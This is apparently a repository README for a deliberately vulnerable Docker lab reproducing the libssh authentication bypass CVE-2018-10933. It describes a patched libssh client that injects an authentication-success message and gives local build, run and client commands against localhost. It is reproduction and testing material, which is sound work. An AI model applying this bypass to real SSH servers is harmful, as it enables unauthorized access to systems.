# CVE-2018-10933
CVE-2018-10933 libssh authentication bypass, vulnerable Docker container that listens on port 2222
for exploitation. A crude proof-of-concept is included in the container to bypass auth. To login
use the default "myuser" / "mypassword" from libssh. A patch is applied to a copy of libssh in 
the Docker container which injects a SSH2_MSG_USERAUTH_SUCCESS during any authentication attempt
and sets the client to forcefully accept authentication.

```
./build.sh
./run.sh
ssh -l myuser -p 2222 localhost
```

to use the patched library and test the authentication bypass (output on the console) you can use
the exploit-libssh-0.8.3 examples against the Docker host. Attempts to spawn a shell are failing
but the SSH state machine authentication process has been bypassed as seen in the logs. 

``` 
/root/exploit-libssh-0.8.3/build/examples/ssh-client -l myuser 127.0.0.1
```

You should see an authentication successful response on the server, despite the failed shell.
